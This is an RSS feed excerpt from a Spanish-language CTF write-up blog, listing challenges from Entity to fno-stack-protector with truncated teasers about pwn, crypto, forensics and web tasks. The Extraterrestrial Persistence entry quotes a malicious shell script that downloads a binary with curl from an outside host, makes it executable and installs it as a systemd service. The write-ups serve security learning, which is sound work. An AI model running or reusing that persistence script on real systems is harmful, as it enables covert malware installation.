$ nc 134.122.106.203 30576 Something strange is coming out of the TV.. (T)ry to turn it off (R)un (C)ry &amp;gt;&amp;gt; Nada explicativo&amp;hellip;
Análisis de código estático Esta vez, se nos proporciona también el código fuente original (chall.</description></item><item><title>Entity</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/entity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/entity/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Si nos conectamos a la instancia remota, vemos lo siguiente:
$ nc 134.122.106.203 30576 Something strange is coming out of the TV.. (T)ry to turn it off (R)un (C)ry &amp;gt;&amp;gt; Nada explicativo&amp;hellip;
Análisis de código estático Esta vez, se nos proporciona también el código fuente original (chall.</description></item><item><title>Eternal Loop</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/eternal-loop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/eternal-loop/</guid><description>Se nos proporciona un archivo ZIP llamado Eternal Loop.zip:
$ file Eternal\ Loop.zip Eternal Loop.zip: Zip archive data, at least v2.0 to extract, compression method=store $ du -h Eternal\ Loop.zip 452K	Eternal Loop.zip $ unzip -v Eternal\ Loop.zip Archive: Eternal Loop.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 460611 Stored 460611 0% 05-23-2018 01:03 b74de99a 37366.zip -------- ------- --- ------- 460611 460611 0% 1 file Archivos incompensadores El archivo ZIP se puede descomprimir con la contraseña hacktkebox:</description></item><item><title>Evaluation Deck</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/evaluation-deck/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/evaluation-deck/</guid><description>Se nos proporciona la siguiente página web:
No obstante, la interfaz no es interesante&amp;hellip;
Análisis de código estático También disponemos del código fuente. La aplicación web está construida en Flask (Python). El siguiente archivo es application/blueprints/routes.py:
from flask import Blueprint, render_template, request from application.util import response web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @api.route('/get_health', methods=['POST']) def count(): if not request.is_json: return response('Invalid JSON!'), 400 data = request.</description></item><item><title>Event Horizon</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/event-horizon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/event-horizon/</guid><description>Tenemos esta descripción del reto:
Our CEO&amp;rsquo;s computer was compromised in a phishing attack. The attackers took care to clear the PowerShell logs, so we don&amp;rsquo;t know what they executed. Can you help us?
Y se nos proporcionan muchos archivos de log:
$ ls -l total 0 drwxrwxr-x 325 root root 10400 Nov 2 2020 Logs drwxrwxr-x 2 root root 64 Sep 15 2018 TraceFormat $ find . . ./Logs .</description></item><item><title>Exif</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/exif/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/exif/</guid><description>Se nos pide encontrar la flag en esta imagen:
Sin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en los metadatos del archivo.
Para extraer los metadatos, podemos utilizar exiftool:
$ exiftool Computer-Password-Security-Hacker\ -\ Copy.jpg ExifTool Version Number : 12.30 File Name : Computer-Password-Security-Hacker - Copy.jpg Directory : . File Size : 54 KiB File Modification Date/Time : - File Access Date/Time : - File Inode Change Date/Time : - File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.</description></item><item><title>ExploitedStream</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/exploitedstream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/exploitedstream/</guid><description>Se nos proporciona un archivo de JavaScript ofuscado llamado exploitedstream.js. Si hacemos un formateo básico, tenemos este código:
var _0x1d30 = [ 'utf8', 'final', 'cGFzc3dvcmRfaXNfdGhlX25hbWVfb2Zfb25lX25wbV9wYWNrYWdl', 'length', 'charAt', 'charCodeAt', 'slice', 'replace', 'substring', '83729c4575f56a8287c0b4e8ee5c33f8cb891ccaddcafb71ef5f7bd067f19d854ab16e0cb22460', 'xor', 'argv', 'log', 'crypto', 'aes-256-ctr', 'createDecipher', 'update', 'hex' ] ;(function (_0x428798, _0x4aa2b6) { var _0x365e1c = function (_0x400e3c) { while (--_0x400e3c) { _0x428798['push'](_0x428798['shift']()) } } _0x365e1c(++_0x4aa2b6) })(_0x1d30, 0x151) var _0x124e = function (_0x55d687, _0x1fe12d) { _0x55d687 = _0x55d687 - 0x0 var _0x4c9c20 = _0x1d30[_0x55d687] return _0x4c9c20 } try { var crypto = require(_0x124e('0x0')), algorithm = _0x124e('0x1') let password_length = 0x12 function decrypt(_0x4450ef, _0x98789e, _0x26b154) { var _0x4d3ebf = crypto[_0x124e('0x2')](_0x98789e, _0x26b154) var _0x589f03 = _0x4d3ebf[_0x124e('0x3')]( _0x4450ef, _0x124e('0x4'), _0x124e('0x5') ) _0x589f03 += _0x4d3ebf[_0x124e('0x6')](_0x124e('0x5')) return _0x589f03 } let binary = '' let for_future_me = _0x124e('0x7') let output = [] for (let i = 0x0; i &amp;lt; binary[_0x124e('0x8')]; i++) { let c = binary[_0x124e('0x9')](i)[_0x124e('0xa')](0x0) let d = ((c &amp;amp; 0x3) &amp;lt;&amp;lt; 0x3) | (c &amp;gt;&amp;gt; 0x2) output['push'](d) } let o = +new Date() + ',' + output[_0x124e('0xb')](0x0, password_length) ['toString']() [_0x124e('0xc')](/,/g, '') [_0x124e('0xd')](0x0, password_length) let noxc = _0x124e('0xe') let _global = global let key = _global['process'] _global[_0x124e('0xf')] = decrypt throw [key[_0x124e('0x10')][0x2] || o, algorithm, _global, noxc] } catch (_0x59227e) { try { let __ = _0x59227e[0x2][_0x124e('0xf')]( _0x59227e[0x3], _0x59227e[0x1], _0x59227e[0x0] ) console[_0x124e('0x11')](__) } catch (_0x79425a) {} } Desofuscación de JavaScript Podemos usar el REPL de Node.</description></item><item><title>Export</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/export/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/export/</guid><description>Se nos proporciona un volcado de memoria llamado WIN-LQS146OE2S1-20201027-142607.raw:
$ file WIN-LQS146OE2S1-20201027-142607.raw WIN-LQS146OE2S1-20201027-142607.raw: data Al leer el nombre, podemos suponer que proviene de una máquina Windows.
Análisis de volcado de memoria Usaremos volatility para analizarlo (específicamente, esta imagen de Docker):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/bash -it phocean/volatility vol@6c13ee800d5a:/volatility$ cd /project vol@6c13ee800d5a:/project$ python /volatility/vol.py -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search.</description></item><item><title>ExpressionalRebel</title><link>https://7rocky.github.io/ctf/htb-challenges/web/expressionalrebel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/expressionalrebel/</guid><description>Tenemos una aplicación web que evalúa las restricciones de Content Security Policy (CSP) que le pongamos:
Análisis de código fuente También tenemos el proyecto, que es una aplicación hecha en Node.js con Express. Podemos ver algunas rutas en routes/api.js:
const express = require('express') const router = express.Router() const { evaluateCsp } = require('../utils') router.post('/evaluate', async (req, res) =&amp;gt; { const { csp } = req.body try { const cspIssues = await evaluateCsp(csp) res.</description></item><item><title>Extraterrestrial Persistence</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/extraterrestrial-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/extraterrestrial-persistence/</guid><description>Se nos proporciona un script de shell llamado persistence.sh:
n=`whoami` h=`hostname` path='/usr/local/bin/service' if [[ "$n" != "pandora" &amp;amp;&amp;amp; "$h" != "linux_HQ" ]]; then exit; fi curl https://files.pypi-install.com/packeges/service -o $path chmod +x $path echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode &amp;gt; /usr/lib/systemd/system/service.service systemctl enable service.service Análisis de script de shell Parece que está verificando algunos valores de la máquina, luego descargando un payload con Curl y ejecutando una cadena codificada en Base64 para guardarla como un servicio.</description></item><item><title>eyes</title><link>https://7rocky.github.io/ctf/other/corctf/eyes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/corctf/eyes/</guid><description>Se nos proporciona el código fuente en SageMath que se usó para cifrar la flag:
from Crypto.Util.number import bytes_to_long, getPrime # my NEW and IMPROVED secret sharing scheme!! (now with multivariate quadratics) with open('flag.txt', 'rb') as f: flag = f.read() s = bytes_to_long(flag) p = getPrime(len(bin(s))) print(p) F = GF(p) N = 1024 conv = lambda n: matrix(F, N, 1, [int(i) for i in list(bin(n)[2:][::-1].ljust(N, '0'))]) A = random_matrix(F, N, N) for i in range(0, N): for j in range(0, i): A[i, j] = 0 B = random_matrix(F, N, 1) C = matrix(F, [F(s)]) fn = lambda x: (x.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/fake-news/</guid><description>Se nos proporciona una carpeta llamada html con muchos archivos de un servidor de WordPress:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Inspección básica Obviamente, wp-blogs llama la atención, así que examinemos los archivos que están dentro:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K	wp-blogs/2022/11/index.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/ctf/other/htb-unictf/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/fake-news/</guid><description>Se nos proporciona una carpeta llamada html con muchos archivos de un servidor de WordPress:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Inspección básica Obviamente, wp-blogs llama la atención, así que examinemos los archivos que están dentro:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K	wp-blogs/2022/11/index.</description></item><item><title>Farfour Post Quantom</title><link>https://7rocky.github.io/ctf/other/securinets-ctf/farfour-post-quantom/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/securinets-ctf/farfour-post-quantom/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import hashlib from os import urandom from random import SystemRandom from sympy import GF from sympy.polys.matrices import DomainMatrix import json from hashlib import md5 random=SystemRandom() shuffle=random.shuffle randint=random.randint randrange=random.randrange uniform = lambda: randrange(257//2) - 257//2 P=GF(257) secret=open("Secret.txt",'rb').read() assert len(secret)==16 flag=open("flag.txt","rb").read() def encrypt_flag(secret): key = hashlib.sha256(secret).digest()[-16:] iv = urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) enc_flag=cipher.</description></item><item><title>Fast Carmichael</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/fast-carmichael/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/fast-carmichael/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from secret import FLAG from Crypto.Util.number import isPrime import socketserver import signal class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5) + 1, 2): if basis[i]: basis[i * i::2 * i] = [False] * ((n - i * i - 1) // (2 * i) + 1) return [2] + [i for i in range(3, n, 2) if basis[i]] def millerRabin(n, b): basis = generate_basis(300) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True def _isPrime(p): if p &amp;lt; 1: return False if (p.</description></item><item><title>Fast Carmichael</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/fast-carmichael/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/fast-carmichael/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from secret import FLAG from Crypto.Util.number import isPrime import socketserver import signal class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5) + 1, 2): if basis[i]: basis[i * i::2 * i] = [False] * ((n - i * i - 1) // (2 * i) + 1) return [2] + [i for i in range(3, n, 2) if basis[i]] def millerRabin(n, b): basis = generate_basis(300) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True def _isPrime(p): if p &amp;lt; 1: return False if (p.</description></item><item><title>Fasting</title><link>https://7rocky.github.io/ctf/imaginaryctf/fasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/fasting/</guid><description>Se nos proporciona un servidor puzzler7.imaginaryctf.org:5005. Si enviamos una petición GET usando curl, obtenemos la siguiente respuesta:
$ curl puzzler7.imaginaryctf.org:5005 {"api_message":"Yet another sourceless web..."} $ curl -i puzzler7.imaginaryctf.org:5005 HTTP/1.1 200 OK date: server: uvicorn content-length: 47 content-type: application/json {"api_message":"Yet another sourceless web..."} Empleando ffuf, descubrimos dos rutas docs y redoc:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://puzzler7.imaginaryctf.org:5005/FUZZ docs [Status: 200, Size: 931, Words: 150, Lines: 31, Duration: 114ms] redoc [Status: 200, Size: 891, Words: 176, Lines: 31, Duration: 111ms] [Status: 200, Size: 47, Words: 4, Lines: 1, Duration: 111ms] Ambas sirven para mostrar una documentación de API para gente que quiera consumir dicha API:</description></item><item><title>Favela Ransomware</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/favela-ransomware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/favela-ransomware/</guid><description>En este reto nos dan un Windows PE llamado favela_ransom.exe junto con otros archivos que forman parte de un ataque de ransomware, junto con los archivos cifrados que tenemos que recuperar:
$ file * diary.txt: data favela_ransom.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows flag.enc: data lia sikora desnuda.jpg: data note.txt: Unicode text, UTF-8 text ransomed.png: PNG image data, 2643 x 1580, 8-bit/color RGBA, non-interlaced Ingeniería inversa Al abrir el ejecutable en Ghidra, y mirar las strings, vemos una curiosa que apunta a un Gist de GitHub: https://gist.</description></item><item><title>Favorite Color</title><link>https://7rocky.github.io/ctf/ctflearn/binary/favorite-color/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/favorite-color/</guid><description>Se nos proporciona un servidor al que conectarnos por SSH. Existe un binario de 32 bits llamado color que es SGID:
color@ubuntu-512mb-nyc3-01:~$ ls -l total 20 -r--r--r-- 1 root root 714 Sep 12 2017 Makefile -r-xr-sr-x 1 root color_pwn 7672 Sep 12 2017 color -r--r--r-- 1 root root 722 Sep 12 2017 color.c -r--r----- 1 root color_pwn 24 Sep 12 2017 flag.txt color@ubuntu-512mb-nyc3-01:~$ file color color: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.</description></item><item><title>Fentastic Moves</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/fentastic-moves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/fentastic-moves/</guid><description>Se nos proporciona una instancia remota para conectarnos:
$ nc 188.166.175.58 32136 Let's see if you can find the best moves for 25 puzzles! (Don't take too long tho :P) White to Move (always) Example: e2e4 8 ♚ 7 ♛ ♘ 6 ♞ 5 ♖ ♟ 4 ♜ 3 ♔ 2 ♞ 1 a b c d e f g h What's the best move? Solución En este reto, se nos muestra un tablero de ajedrez y se nos pide el siguiente mejor movimiento.</description></item><item><title>fermat-strings</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/fermat-strings/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Análisis de código estático Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir dos números y tratar de buscar uno que rompa el Último Teorema de Fermat.
Como recordatorio, el Último Teorema de Fermat dice que no existen números positivos $a$, $b$, $c$ que cumplan la ecuación:</description></item><item><title>Fibopadcci</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/fibopadcci/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/fibopadcci/</guid><description>Se nos proporciona el código fuente en Python del servidor:
import socketserver from Crypto.Cipher import AES import os from secret import flag, key fib = [1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 121, 98, 219, 61] wlc_msg = """ ------------------------------------------------------------------------- | Welcome to my Super Secure Encryption service! | | We use AES along with custom padding for authentication | | for extra security, so only admins should be able to | | decrypt the flag with the key I have provided them!</description></item><item><title>FileStorage</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/filestorage/</guid><description>Este es un reto que diseñé para Hack the Box. Se nos proporciona un binario de 64 bits llamado file_storage:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Vemos que tiene NX habilitado, por lo que no podemos ejecutar shellcode personalizado en la pila directamente. Además, tiene Partial RELRO, lo que significa que la Tabla de Offsets Globales (GOT) puede modificarse de algunas maneras.</description></item><item><title>filtered-shellcode</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/filtered-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/filtered-shellcode/</guid><description>Se nos proporciona un binario de 32 bits llamado fun:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments No tenemos el código fuente en C. Esta vez, en lugar de hacer ingeniería inversa con Ghidra, analizaremos el binario con GDB.
Primero, vamos a ejecutar el programa:
$ ./fun Give me code to run: asdf zsh: segmentation fault (core dumped) .</description></item><item><title>Finale</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/finale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/finale/</guid><description>Se nos proporciona un binario de 64 bits llamado finale:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Configuración del entorno Puede ocurrir que no tengamos la versión de Glibc que acepta el programa:
$ ./finale ./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale) Por suerte, en Spooky Time nos dan una librería y un loader, versión 2.35:
$ ../pwn_spooky_time/glibc/ld-linux-x86-64.so.2 ../pwn_spooky_time/glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.</description></item><item><title>Finale</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/finale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/finale/</guid><description>Se nos proporciona un binario de 64 bits llamado finale:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Configuración del entorno Puede ocurrir que no tengamos la versión de Glibc que acepta el programa:
$ ./finale ./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale) Por suerte, en Spooky Time nos dan una librería y un loader, versión 2.35:
$ ../pwn_spooky_time/glibc/ld-linux-x86-64.so.2 ../pwn_spooky_time/glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.</description></item><item><title>Find Marher's Secret</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/find-marhers-secret/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/find-marhers-secret/</guid><description>Se nos proporciona un sódigo en Python y un servidor al que conectarnos:
$ nc 161.35.172.25 32275 Connected to the cyborg's debugging interface Options: 1. Encrypt your text. 2. Claim the key. &amp;gt; Análisis de código estático Esta es la parte importante del código:
def challenge(req): key = bytes.fromhex(KEY) assert(len(key) == 27) req.sendall(b'Connected to the cyborg\'s debugging interface\n') while True: req.sendall( b'\nOptions:\n1. Encrypt your text.\n2. Claim the key.\n&amp;gt; ') try: response = json.</description></item><item><title>Find The Easy Pass</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/find-the-easy-pass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/find-the-easy-pass/</guid><description>Se nos proporciona un binario de 32 bits llamado EasyPass.exe que es un archivo Windows PE:
$ file EasyPass.exe EasyPass.exe: PE32 executable (GUI) Intel 80386, for MS Windows Si lo ejecutamos en una máquina Windows, nos preguntará por una contraseña:
Como la contraseña será incorrecta, veremos un mensaje &amp;ldquo;Wrong Password!&amp;rdquo;:
Un análisis de código estático con Ghidra no es útil. Por tanto, vamos a utilizar un depurador como x32dbg para depurar el binario.</description></item><item><title>fizzbuzz100</title><link>https://7rocky.github.io/ctf/other/corctf/fizzbuzz100/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/corctf/fizzbuzz100/</guid><description>Se nos proporciona el código fuente en Python que se ejecuta en el servidor:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) print(f"{n = }") print(f"{e = }") print(f"{ct = }"</description></item><item><title>fizzbuzz101</title><link>https://7rocky.github.io/ctf/other/corctf/fizzbuzz101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/corctf/fizzbuzz101/</guid><description>Se nos proporciona el código fuente en Python que se ejecuta en el servidor:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) print(f"{n = }") print(f"{e = }") print(f"{ct = }"</description></item><item><title>fizzbuzz102</title><link>https://7rocky.github.io/ctf/other/corctf/fizzbuzz102/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/corctf/fizzbuzz102/</guid><description>Se nos proporciona el código fuente en Python que se ejecuta en el servidor:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom from secrets import randbits flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) a = randbits(845) b = randbits(845) def lcg(x): return (a * x + b) % n print(f"</description></item><item><title>Fleet Management</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/fleet-management/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/fleet-management/</guid><description>Se nos proporciona un binario de 64 bits llamado fleet_management:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Si lo abrimos en Ghidra, veremos esta función main:
int main() { setup(); fprintf(stdout, "%s %s Fleet Management System %s\n", &amp;amp;DAT_001023e5, &amp;amp;DAT_001020e9, &amp;amp;DAT_001023e0); fprintf(stdout, "\n%s[*] Loading . . .\n%s", &amp;amp;DAT_001020f1, &amp;amp;DAT_001020e9); sleep(2); menu(); return 0; } Está llamando a menu:
void menu() { long in_FS_OFFSET; undefined8 uVar1; char local_13 [3]; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); memset(local_13, 0, 3); do { fwrite("</description></item><item><title>Fleeting</title><link>https://7rocky.github.io/ctf/imaginaryctf/fleeting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/fleeting/</guid><description>Se nos proporciona este código en Python para cifrar la flag, y también el texto cifrado como un comentario:
print((f:=lambda s:s and[s[0]^s[-1],*f(s[::-1][1:])])([*open('flag','rb')][0])) #[20, 37, 47, 47, 56, 52, 38, 46, 51, 56, 23, 58, 57, 50, 86, 95, 95, 103, 0] Análisis de código fuente Si analizamos el código, veremos que se define una función lambda nombrada f y la llama con el contenido de la flag en bytes:
$ echo -n 'ictf{test_flag}' &amp;gt; flag $ python3 -q &amp;gt;&amp;gt;&amp;gt; [*open('flag','rb')][0] b'ictf{test_flag}' Entonces, f es una función que devuelve s and [.</description></item><item><title>Flippin Bank</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/flippin-bank/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/flippin-bank/</guid><description>Se nos proporciona el código fuente del servidor en Python:
import socketserver import socket, os from Crypto.Cipher import AES from Crypto.Util.Padding import pad,unpad from Crypto.Random import get_random_bytes from binascii import unhexlify from secret import FLAG wlcm_msg ='########################################################################\n'+\ '# Welcome to the Bank of the World #\n'+\ '# All connections are monitored and recorded #\n'+\ '# Disconnect IMMEDIATELY if you are not an authorized user! #\n'+\ '########################################################################\n' key = get_random_bytes(16) iv = get_random_bytes(16) def encrypt_data(data): padded = pad(data.</description></item><item><title>fno-stack-protector</title><link>https://7rocky.github.io/ctf/other/blackhat-ctf/fno-stack-protector/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/blackhat-ctf/fno-stack-protector/</guid><description>Se nos proporciona un binario de 64 bits llamado main:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Si lo abrimos en Ghidra, veremos las siguientes funciones:
